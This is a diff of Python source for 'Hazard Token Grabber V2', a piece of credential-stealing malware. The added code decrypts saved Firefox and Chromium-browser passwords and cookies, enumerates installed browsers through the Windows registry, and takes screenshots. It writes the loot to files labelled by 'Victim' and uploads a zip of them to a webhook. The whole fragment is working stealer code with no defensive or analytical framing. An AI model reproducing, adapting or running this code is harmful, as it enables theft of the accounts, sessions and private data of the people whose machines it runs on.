+            print(hexlify(key))
+            return key[:24], pbeAlgo
+        elif pbeAlgo == '1.2.840.113549.1.5.13':
+            assert str(decodedItem[0][0][1][0][0]) == '1.2.840.113549.1.5.12'
+            assert str(decodedItem[0][0][1][0][1][3]
+                       [0]) == '1.2.840.113549.2.9'
+            assert str(decodedItem[0][0][1][1][0]) == '2.16.840.1.101.3.4.1.42'
+            entrySalt = decodedItem[0][0][1][0][1][0].asOctets()
+            iterationCount = int(decodedItem[0][0][1][0][1][1])
+            keyLength = int(decodedItem[0][0][1][0][1][2])
+            assert keyLength == 32
+
+            k = sha1(globalSalt).digest()
+            key = pbkdf2_hmac('sha256', k, entrySalt,
+                              iterationCount, dklen=keyLength)
+
+            iv = b'\x04\x0e'+decodedItem[0][0][1][1][1].asOctets()
+            cipherT = decodedItem[0][1].asOctets()
+            clearText = AES.new(key, AES.MODE_CBC, iv).decrypt(cipherT)
+
+            return clearText, pbeAlgo
+
+    def getKey(self, directory, options):
+        if (directory / 'key4.db').exists():
+            conn = sqlite3.connect(directory / 'key4.db')
+            c = conn.cursor()
+            c.execute("SELECT item1,item2 FROM metadata WHERE id = 'password';")
+            row = c.fetchone()
+            globalSalt = row[0]
+            item2 = row[1]
+            self.printASN1(item2, len(item2), 0)
+            decodedItem2 = decoder.decode(item2)
+            clearText, algo = self.decryptPBE(
+                decodedItem2,  globalSalt, options)
+
+            if clearText == b'password-check\x02\x02':
+                c.execute("SELECT a11,a102 FROM nssPrivate;")
+                for row in c:
+                    if row[0] != None:
+                        break
+                a11 = row[0]
+                a102 = row[1]
+                if a102 == self.CKA_ID:
+                    self.printASN1(a11, len(a11), 0)
+                    decoded_a11 = decoder.decode(a11)
+                    clearText, algo = self.decryptPBE(
+                        decoded_a11,  globalSalt, options)
+                    return clearText[:24], algo
+            return None, None
+        elif (directory / 'key3.db').exists():
+            keyData = self.readBsddb(directory / 'key3.db', options)
+            key = self.extractSecretKey(keyData)
+            return key, '1.2.840.113549.1.12.5.1.3'
+        else:
+            print('cannot find key4.db or key3.db')
+            return None, None
+
+    @try_extract
+    def main(self):
+        profilesPath = self.roaming + '\\Mozilla\\Firefox\\Profiles'
+        mozillaProfiles = os.listdir(profilesPath)
+        for profile in mozillaProfiles:
+            options = {
+                'verbose': 0,
+                'directory': Path(profilesPath + os.sep + profile)
+            }
+            key, algo = self.getKey(options['directory'], options)
+            if key == None:
+                continue
+            logins = self.getLoginData(options)
+            if algo == '1.2.840.113549.1.12.5.1.3' or algo == '1.2.840.113549.1.5.13':
+                with open(self.dir + os.sep + 'firefox_pass.csv', mode='a', newline='', encoding='utf-8') as decrypt_password_file:
+                    csv_writer = csv.writer(
+                        decrypt_password_file, delimiter=',')
+                    csv_writer.writerow(["url", "username", "password"])
+                    for i in logins:
+                        assert i[0][0] == self.CKA_ID
+                        url = '%20s:' % (i[2])
+                        iv = i[0][1]
+                        ciphertext = i[0][2]
+                        name = str(unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(
+                            ciphertext), 8), encoding="utf-8")
+                        iv = i[1][1]
+                        ciphertext = i[1][2]
+                        passw = str(unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(
+                            ciphertext), 8), encoding="utf-8")
+                        csv_writer.writerow([url, name, passw])
+
+    @try_extract
+    def firefoxCookies(self):
+        profilesPath = self.roaming + '\\Mozilla\\Firefox\\Profiles'
+        mozillaProfiles = os.listdir(profilesPath)
+        path = self.roaming + '\\Mozilla\\Firefox\\Profiles'
+        for profile in mozillaProfiles:
+            try:
+                conn = sqlite3.connect(
+                    path + os.sep + profile + os.sep + "\\cookies.sqlite")
+                res = conn.execute("SELECT * FROM moz_cookies").fetchall()
+                conn.close()
+                with open(self.dir + os.sep + f'moz_{profile}_cookies.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
+                    csv_writer = csv.writer(
+                        decrypt_password_file, delimiter=',')
+                    for row in res:
+                        x = list(row)
+                        csv_writer.writerow(x)
+
+            except Exception as e:
+                print(e)
+
+    def decryptString(self, key, data):
+        nonce, cipherbytes = data[3:15], data[15:]
+        aesgcm = AESGCM(key)
+        plainbytes = aesgcm.decrypt(nonce, cipherbytes, None)
+        plaintext = plainbytes.decode('utf-8')
+
+        return plaintext
+
+    def getKeyCH(self, path):
+        LocalState = path + r'\Local State'
+        with open(LocalState, 'r', encoding='utf-8') as f:
+            base64_encrypted_key = json.load(f)['os_crypt']['encrypted_key']
+        encrypted_key_with_header = base64.b64decode(base64_encrypted_key)
+        encrypted_key = encrypted_key_with_header[5:]
+        key = win32crypt.CryptUnprotectData(
+            encrypted_key, None, None, None, 0)[1]
+        return key
+
+    def getChromeCookie(self, path, profile, name):
+        if profile == None:
+            cookiepath = path + os.sep + r"\Network\Cookies"
+            if not os.path.exists(cookiepath):
+                cookiepath = path + os.sep + r"\Cookies"
+            if not os.path.exists(cookiepath):
+                return
+        else:
+            cookiepath = path + os.sep + profile + r"\Network\Cookies"
+            if not os.path.exists(cookiepath):
+                cookiepath = path + os.sep + profile + r"\Cookies"
+            if not os.path.exists(cookiepath):
+                return
+        sql = f"select * from cookies"
+
+        try:
+            conn = sqlite3.connect(cookiepath)
+            conn.text_factory = bytes
+            res = conn.execute(sql).fetchall()
+            conn.close()
+        except Exception as e:
+            print(e)
+        key = self.getKeyCH(path)
+        with open(self.dir + os.sep + f'{name}_cookies.csv', mode='a', newline='', encoding='utf-8') as decrypt_password_file:
+            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
+            csv_writer.writerow(["creation_utc", "host_key", "top_frane_site_key", "name", "value", "encrypted_value", "path", "expires_utc", "is_secure",
+                                "is_httponly", "last_access_utc", "has_expires", "is_persistent", "priority", "samesite", "source_scheme", "source_port", "is_same_party"])
+            for row in res:
+                x = list(row)
+                for num in range(0, len(x)):
+                    try:
+                        x[num] = str(x[num], encoding="utf-8")
+                    except:
+                        pass
+                x[5] = self.decryptString(key, x[5])
+                csv_writer.writerow(x)
+
+    def paths(self):
+        paths = {
+            'Opera': self.roaming + '\\Opera Software\\Opera Stable',
+            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable',
+            'Vivaldi': self.appdata + '\\Vivaldi\\User Data',
+            'Chrome': self.appdata + '\\Google\\Chrome\\User Data',
+            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data',
+            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
+            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
+            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
+            'Iridium': self.appdata + '\\Iridium\\User Data',
+            'Firefox': self.roaming + '\\Mozilla\\Firefox\\Profiles'
+        }
+        return paths
+
+    def userBrowserss(self):
+        aKey = r"SOFTWARE\Clients\StartMenuInternet"
+        aReg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
+        browsers = ['Opera', 'Opera GX', 'Vivaldi', 'Chrome',
+                    'Microsoft Edge', 'Uran', 'Yandex', 'Brave', 'Iridium', 'Firefox']
+        aKey = winreg.OpenKey(aReg, aKey)
+
+        userBrowsers = []
+        for i in range(1024):
+            try:
+                asubkey_name = winreg.EnumKey(aKey, i)
+                userBrowsers.append(asubkey_name)
+            except EnvironmentError:
+                break
+
+        aKey = r"SOFTWARE\Clients\StartMenuInternet"
+        aReg = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
+        browsers = ['Opera', 'Opera GX', 'Vivaldi', 'Chrome',
+                    'Microsoft Edge', 'Uran', 'Yandex', 'Brave', 'Iridium', 'Firefox']
+        aKey = winreg.OpenKey(aReg, aKey)
+
+        for i in range(1024):
+            try:
+                asubkey_name = winreg.EnumKey(aKey, i)
+                if asubkey_name not in userBrowsers:
+                    userBrowsers.append(asubkey_name)
+            except EnvironmentError:
+                break
+
+        used = []
+        for browser in browsers:
+            for userBrowser in userBrowsers:
+                if browser in userBrowser:
+                    used.append(browser)
+
+        return used
+
+    def browserPaths(self):
+        usedPaths = []
+        paths = self.userBrowserss()
+        for browser in paths:
+            if browser != 'Firefox':
+                usedPaths.append(self.paths()[browser])
+        return usedPaths
+
+    def without(self):
+        browsers = []
+        for browser in self.userBrowserss():
+            if browser != 'Firefox':
+                browsers.append(browser)
+        return browsers
+
+    def profiles(self, browser):
+        chromeProfiles = []
+        if os.path.exists(self.paths()[browser]) == False:
+            return chromeProfiles
+        files = os.listdir(self.paths()[browser])
+        was = False
+        for num in range(11):
+            for file in files:
+                if 'default' == file.lower() and was == False:
+                    chromeProfiles.append(file)
+                    was = True
+                if file.lower() == 'profile ' + str(num):
+                    chromeProfiles.append(file)
+        return chromeProfiles
+
+    @try_extract
+    def chCookies(self):
+        num = -1
+        for path in self.browserPaths():
+            num += 1
+            name = self.without()[num]
+            profiles = self.profiles(name)
+            if len(profiles) == 0:
+                self.getChromeCookie(path=path, profile=None, name=name)
+            else:
+                for profile in profiles:
+                    self.getChromeCookie(path, profile, name)
 
     def screenshot(self):
         image = ImageGrab.grab(
@@ -845,6 +885,104 @@ class Hazard_Token_Grabber_V2(functions):
         )
         image.save(self.dir + "\\Screenshot.png")
         image.close()
+
+    def get_secret_key(self):
+        try:
+            with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
+                local_state = f.read()
+                local_state = json.loads(local_state)
+            secret_key = base64.b64decode(
+                local_state["os_crypt"]["encrypted_key"])
+            secret_key = secret_key[5:]
+            secret_key = win32crypt.CryptUnprotectData(
+                secret_key, None, None, None, 0)[1]
+            return secret_key
+        except Exception as e:
+            print("%s" % str(e))
+            print("[ERR] Chrome secretkey cannot be found")
+            return None
+
+    def decrypt_payload(self, cipher, payload):
+        return cipher.decrypt(payload)
+
+    def generate_cipher(self, aes_key, iv):
+        return AES.new(aes_key, AES.MODE_GCM, iv)
+
+    def decrypt_password(self, ciphertext, secret_key):
+        try:
+            initialisation_vector = ciphertext[3:15]
+            encrypted_password = ciphertext[15:-16]
+            cipher = self.generate_cipher(secret_key, initialisation_vector)
+            decrypted_pass = self.decrypt_payload(cipher, encrypted_password)
+            decrypted_pass = decrypted_pass.decode()
+            return decrypted_pass
+        except Exception as e:
+            print("%s" % str(e))
+            print(
+                "[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
+            return ""
+
+    def get_db_connection(self, chrome_path_login_db):
+        try:
+            shutil.copy2(chrome_path_login_db, "Loginvault.db")
+            return sqlite3.connect("Loginvault.db")
+        except Exception as e:
+            print("%s" % str(e))
+            print("[ERR] Chrome database cannot be found")
+            return None
+
+    def mainDecrypt(self, paths, names):
+        num = -1
+        for path in paths:
+            num += 1
+            global CHROME_PATH_LOCAL_STATE
+            CHROME_PATH_LOCAL_STATE = path + '\\Local State'
+            global CHROME_PATH
+            CHROME_PATH = path
+            if os.path.exists(CHROME_PATH_LOCAL_STATE) == False:
+                continue
+            try:
+                with open(self.dir + os.sep + f'{names[num]}_pasw.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
+                    csv_writer = csv.writer(
+                        decrypt_password_file, delimiter=',')
+                    csv_writer.writerow(
+                        ["index", "url", "username", "password"])
+                    secret_key = self.get_secret_key()
+                    folders = [element for element in os.listdir(
+                        CHROME_PATH) if re.search("^Profile*|^Default$", element) != None]
+                    length = len(folders)
+                    if length == 0:
+                        length = 1
+                    for numm in range(0, length):
+                        if len(folders) == 0:
+                            chrome_path_login_db = os.path.normpath(
+                                path + '\\Login Data')
+                        else:
+                            chrome_path_login_db = os.path.normpath(
+                                r"%s\%s\Login Data" % (CHROME_PATH, folders[numm]))
+                        conn = self.get_db_connection(chrome_path_login_db)
+                        if(secret_key and conn):
+                            cursor = conn.cursor()
+                            cursor.execute(
+                                "SELECT action_url, username_value, password_value FROM logins")
+                            for index, login in enumerate(cursor.fetchall()):
+                                url = login[0]
+                                username = login[1]
+                                ciphertext = login[2]
+                                if(url != "" and username != "" and ciphertext != ""):
+                                    decrypted_password = self.decrypt_password(
+                                        ciphertext, secret_key)
+                                    csv_writer.writerow(
+                                        [index, url, username, decrypted_password])
+                            cursor.close()
+                            conn.close()
+                            os.remove("Loginvault.db")
+            except Exception as e:
+                print("[ERR] " % str(e))
+
+    @try_extract
+    def chromium_pasw(self):
+        self.mainDecrypt(self.browserPaths(), self.without())
 
     def finish(self):
         for i in os.listdir(self.dir):
@@ -858,10 +996,10 @@ class Hazard_Token_Grabber_V2(functions):
                     else:
                         with open(path, "w", encoding="utf-8", errors="ignore") as f:
                             f.write(
-                                "🌟・Grabber By github.com/Rdimo・github.com/Mantelyys\n\n")
+                                "🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
                         with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                             fp.write(
-                                x+"\n\n🌟・Grabber By github.com/Rdimo・github.com/Mantelyys")
+                                x+"\n\n🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2")
         w = self.getProductValues()
         wname = w[0].replace(" ", "᠎ ")
         wkey = w[1].replace(" ", "᠎ ")
@@ -905,8 +1043,8 @@ class Hazard_Token_Grabber_V2(functions):
             'embeds': [
                 {
                     'author': {
-                        'name': f'*{Victim}* Just ran grabber',
-                        'url': 'https://github.com/Mantelyys/browsers-data-grabber',
+                        'name': f'*{Victim}* Just ran Hazard Token Grabber.V2',
+                        'url': 'https://github.com/Rdimo/Hazard-Token-Grabber-V2',
                         'icon_url': 'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif'
                     },
                     'color': 16119101,
@@ -952,7 +1090,7 @@ class Hazard_Token_Grabber_V2(functions):
                         }
                     ],
                     'footer': {
-                        'text': '🌟・Grabber By github.com/Rdimo・github.com/Mantelyys'
+                        'text': '🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2'
                     }
                 }
             ]
@@ -964,10 +1102,8 @@ class Hazard_Token_Grabber_V2(functions):
             else:
                 from pyotp import TOTP
                 key = TOTP(self.fetchConf('webhook_protector_key')).now()
-                httpx.post(self.webhook, headers={
-                           "Authorization": key}, json=embed)
-                httpx.post(self.webhook, headers={
-                           "Authorization": key}, files={'upload_file': f})
+                httpx.post(self.webhook, headers={"Authorization": key}, json=embed)
+                httpx.post(self.webhook, headers={"Authorization": key}, files={'upload_file': f})
         os.remove(_zipfile)
 
 
